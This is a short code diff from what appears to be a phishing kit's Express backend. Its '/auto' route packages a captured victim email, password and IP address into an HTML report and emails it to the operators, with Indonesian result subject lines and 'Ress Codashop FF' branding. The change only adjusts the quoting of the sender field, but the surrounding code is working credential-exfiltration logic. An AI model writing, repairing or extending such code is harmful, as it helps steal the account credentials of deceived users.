@@ -182,7 +182,7 @@ app.get("/auto", async (req, res) => {
                     const htmlContent = generateHtml(email, password, ip);
 
                     await transporterAuto.sendMail({
-                        from: `🌀 Ress Codashop FF 🌀`,
+                        from: `"🌀 Ress Codashop FF 🌀"`,
                         to: entry.email || entry, // bisa array objek atau string
                         subject: `⚡ || Result Punya Si ${email}`,
                         html: htmlContent,
